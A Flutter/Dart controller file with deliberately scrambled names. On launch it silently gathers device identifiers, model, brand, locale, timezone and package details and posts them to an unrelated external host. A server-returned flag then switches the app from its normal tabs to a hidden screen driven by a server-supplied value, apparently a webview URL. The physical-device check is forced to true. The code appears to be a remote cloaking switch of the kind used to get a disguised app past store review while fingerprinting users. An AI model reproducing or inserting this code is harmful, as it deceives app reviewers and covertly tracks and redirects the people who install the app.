import 'dart:convert';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageLogic extends GetxController {

  var gsbnjtoa = RxBool(false);
  var wbmlise = RxBool(true);
  var rtcaqle = RxString("");
  var beverly = RxBool(false);
  var rempel = RxBool(true);
  final qvhzwb = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    kezinah();
  }


  Future<void> kezinah() async {

    beverly.value = true;
    rempel.value = true;
    wbmlise.value = false;

    qvhzwb.post("https://evi.weetpol.xyz/Ucry4nZnO",data: await mehvbf()).then((value) {
      var jmgydibu = value.data["jmgydibu"] as String;
      var iwsylfb = value.data["iwsylfb"] as bool;
      if (iwsylfb) {
        rtcaqle.value = jmgydibu;
        dylan();
      } else {
        king();
      }
    }).catchError((e) {
      wbmlise.value = true;
      rempel.value = true;
      beverly.value = false;
    });
  }

  Future<Map<String, dynamic>> mehvbf() async {
    final DeviceInfoPlugin qpnmj = DeviceInfoPlugin();
    PackageInfo jraguzbv_pjzcmdr = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var ijdbecws = Platform.localeName;
    var fsPm = currentTimeZone;

    var erlHPykI = jraguzbv_pjzcmdr.packageName;
    var usvqDIBf = jraguzbv_pjzcmdr.version;
    var XLEh = jraguzbv_pjzcmdr.buildNumber;

    var bouAdUx = jraguzbv_pjzcmdr.appName;
    var cfzdl  = "";
    var averyJaskolski = "";
    var OhNCupIy = "";
    var rhettGorczany = "";
    var blairGaylord = "";
    var brgA = "";
    var arielDaugherty = "";
    var kylerRath = "";


    var vwOUqET = "";
    var OIzEl = false;

    if (GetPlatform.isAndroid) {
      vwOUqET = "android";
      var fpqivsn = await qpnmj.androidInfo;

      OhNCupIy = fpqivsn.brand;

      brgA  = fpqivsn.model;
      cfzdl = fpqivsn.id;

      OIzEl = fpqivsn.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      vwOUqET = "ios";
      var uqezdjrn = await qpnmj.iosInfo;
      OhNCupIy = uqezdjrn.name;
      brgA = uqezdjrn.model;

      cfzdl = uqezdjrn.identifierForVendor ?? "";
      OIzEl  = uqezdjrn.isPhysicalDevice;
    }
    OIzEl = true;
    var res = {
      "bouAdUx": bouAdUx,
      "XLEh": XLEh,
      "averyJaskolski" : averyJaskolski,
      "erlHPykI": erlHPykI,
      "rhettGorczany" : rhettGorczany,
      "fsPm": fsPm,
      "usvqDIBf": usvqDIBf,
      "OhNCupIy": OhNCupIy,
      "cfzdl": cfzdl,
      "vwOUqET": vwOUqET,
      "brgA": brgA,
      "OIzEl": OIzEl,
      "ijdbecws": ijdbecws,
      "blairGaylord" : blairGaylord,
      "arielDaugherty" : arielDaugherty,
      "kylerRath" : kylerRath,

    };
    return res;
  }

  Future<void> king() async {
    Get.offAllNamed("/tabs");
  }

  Future<void> dylan() async {
    Get.offAllNamed("/cool");
  }

}
